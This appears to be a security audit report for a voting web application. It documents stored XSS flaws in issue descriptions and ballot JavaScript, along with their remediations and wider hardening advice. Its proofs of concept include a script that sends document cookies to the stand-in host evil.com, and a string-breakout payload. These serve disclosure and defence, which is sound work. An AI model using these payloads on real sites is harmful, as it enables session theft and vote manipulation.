## ASVS-3.2.2: Unintended Content Interpretation (Safe Text Rendering)

### Findings for 3.2.2

### [HIGH]
**Finding ID:** ASVS-322-HIGH-001

**Title:** Issue Descriptions Rendered as Raw HTML Without Sanitization

**File:** `v3/server/pages.py`, function `rewrite_description`, lines 49-57, and templates `vote-on.ezt`, `manage.ezt`

**Vulnerable code (pages.py):**
```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

**Template rendering (vote-on.ezt line ~138):**
```html
<div id="description-[issues.iid]" class="description mt-2 text-muted small">
  [issues.description]
</div>
```

**Data flow:** Admin form input (`form.description`) → `do_add_issue_endpoint()` → database → `rewrite_description()` (wraps in `<pre>` without escaping) → EZT template → rendered as HTML in voter's browser

**Proof of concept:**
A malicious committer creates an issue with description:
```
</pre><script>fetch('https://evil.com/steal?c='+document.cookie)</script><pre>
```
When any voter views this election via `/vote-on/<eid>`, the script executes in their browser session.

**Impact:** Stored XSS via issue descriptions. Any committer with access to create/edit issues can inject arbitrary JavaScript that executes in the browsers of all voters viewing that election. This could steal session tokens, cast votes on behalf of other users, or manipulate the voting interface.

**Remediation:**
```python
import html

def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = html.escape(issue.description)  # Escape HTML entities FIRST
    def repl(match):
        filename = html.escape(match.group(1))
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

### [MEDIUM]
**Finding ID:** ASVS-322-MED-001

**Title:** innerHTML Used for Candidate Name Rendering in STV Modal

**File:** `v3/server/templates/vote-on.ezt`, JavaScript function `makeItem`, approximately line 280

**Vulnerable code:**
```javascript
function makeItem(candidate, rank) {
    const div = document.createElement('div');
    div.className    = 'stv-item';
    div.dataset.label = candidate.label;
    if (rank) div.dataset.rank = rank;
    div.innerHTML = '<span class="drag-handle bi bi-grip-vertical"></span>'
                  + '<span class="cand-name">' + escapeHtml(candidate.name) + '</span>';
    div.addEventListener('dblclick', () => moveItem(div));
    return div;
}
```

**Data flow:** Server-rendered candidate data in `STV_CANDIDATES` object → `makeItem()` → `innerHTML` assignment

**Mitigating factor:** The `escapeHtml()` function is applied:
```javascript
function escapeHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
            .replace(/"/g,'&quot;');
}
```

**Impact:** LOW to MEDIUM — While `escapeHtml()` is applied, using `innerHTML` creates a pattern that's fragile. The `escapeHtml` function doesn't escape single quotes (`'`), though in this context it's not exploitable. The preferred approach per ASVS 3.2.2 is to use DOM APIs like `createTextNode`/`textContent`.

**Remediation:**
```javascript
function makeItem(candidate, rank) {
    const div = document.createElement('div');
    div.className = 'stv-item';
    div.dataset.label = candidate.label;
    if (rank) div.dataset.rank = rank;
    
    const handle = document.createElement('span');
    handle.className = 'drag-handle bi bi-grip-vertical';
    div.appendChild(handle);
    
    const nameSpan = document.createElement('span');
    nameSpan.className = 'cand-name';
    nameSpan.textContent = candidate.name;  // Safe: textContent
    div.appendChild(nameSpan);
    
    div.addEventListener('dblclick', () => moveItem(div));
    return div;
}
```

### [MEDIUM]
**Finding ID:** ASVS-322-MED-002

**Title:** Unescaped Server Data in JavaScript String Literals (STV_CANDIDATES)

**File:** `v3/server/templates/vote-on.ezt`, approximately lines 240-255

**Vulnerable code:**
```javascript
const STV_CANDIDATES = {
    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",
      candidates: [
        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },
      ]
    },
};
```

**Data flow:** Database values (issue title, candidate label/name) → EZT template without `[format "js,html"]` → JavaScript string literal → used in DOM operations

**Proof of concept:** An admin creates an issue with title: `Test", candidates: [{label:"x",name:"<img src=x onerror=alert(1)>"}]}; alert("XSS");//`

**Impact:** If issue titles or candidate names contain double quotes or backslashes, they break out of the JavaScript string context. This enables injection of arbitrary JavaScript that executes for every voter viewing the ballot.

**Remediation:** Use `[format "js"]` or `[format "js,html"]` EZT escaping:
```javascript
const STV_CANDIDATES = {
    "[format "js"][issues.iid][end]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
        { label: "[format "js"][issues.candidates.label][end]", 
          name: "[format "js"][issues.candidates.name][end]" },
      ]
    },
};
```

## Cross-cutting Architecture Observations

1. **Defense-in-Depth Gap:** The application relies heavily on authentication (`@asfquart.auth.require`) as its primary security boundary but lacks multiple defense layers. There is no CSP, no CSRF validation, no rate limiting, and incomplete authorization — if authentication is bypassed, nearly all controls fail.

2. **Type B Gaps (Control Exists but Not Applied):**
   - CSRF token is generated (`basic.csrf_token = 'placeholder'`) and sent to templates, but NEVER validated server-side on any POST endpoint.
   - The `[format "js,html"]` EZT escaping is used in `manage.ezt` for issue titles in onclick handlers but NOT used in `vote-on.ezt` for STV_CANDIDATES data.
   - Authorization check comments (`### check authz`) exist at 8+ locations but authorization logic is never implemented.

3. **Mixed Security Maturity:** The `vote-on.ezt` template demonstrates good practices (IIFE, escapeHtml, textContent) while other templates (`manage.ezt`, `manage-stv.ezt`) use global scope and raw HTML rendering. The `election.py` module has strong cryptographic vote protection while `pages.py` has fundamental web security gaps.

4. **State-Changing GET Requests:** `/do-open/<eid>` and `/do-close/<eid>` use GET methods for state-changing operations. This violates HTTP semantics and makes CSRF trivially exploitable (no CSRF token needed for GET requests). The `manage.ezt` template triggers these via `window.location.href`, confirming this is by design.

5. **Document Serving as Attack Vector:** The `serve_doc()` endpoint combined with `rewrite_description()` creating links to documents creates a complete attack chain: upload malicious HTML → link is auto-generated in issue description → voters click link → XSS in application origin.

## Cross-cutting Recommendations

### Immediate (Critical/High — deploy blockers)

1. **Fix `rewrite_description()`** to HTML-escape description content before wrapping in `<pre>` tags (ASVS-322-HIGH-001).
2. **Add `Content-Disposition: attachment`** to `serve_doc()` responses and validate `docname` for path traversal (ASVS-321-HIGH-001).
3. **Implement CSRF validation** — the token infrastructure exists but is never verified. Add a decorator for POST endpoints that validates the token from the form/header matches the session value.
4. **Add `[format "js"]` escaping** to all EZT values rendered inside JavaScript string literals in `vote-on.ezt` (ASVS-322-MED-002).

### Short-term (1-2 sprints)

5. **Implement CSP headers** — start with `Content-Security-Policy: default-src 'self'` and nonce-based script allowance. This mitigates multiple XSS vectors.
6. **Configure session cookies** with `Secure`, `HttpOnly`, `SameSite=Lax`, and `__Host-` prefix (ASVS-331-HIGH-001).
7. **Add rate limiting middleware** for vote submission and election creation endpoints (ASVS-242-HIGH-001).
8. **Convert state-changing GET endpoints** (`/do-open/`, `/do-close/`) to POST with CSRF validation.
9. **Wrap `manage.ezt` JavaScript** in IIFE with strict mode and add type checking on `getElementById` results (ASVS-323-MED-001).

### Long-term (architectural improvements)

10. **Implement authorization framework** — replace all `### check authz` placeholders with ownership/permission verification.
11. **Create security documentation** per ASVS 3.1.1, specifying browser requirements and degradation behavior.
12. **Migrate `steve.js`** global functions to a namespaced module object to prevent DOM clobbering.
13. **Add X-Content-Type-Options: nosniff** globally via middleware for all responses.
14. **Implement comprehensive anti-automation** including per-endpoint rate limits, minimum timing between sensitive operations, and account-level throttling.
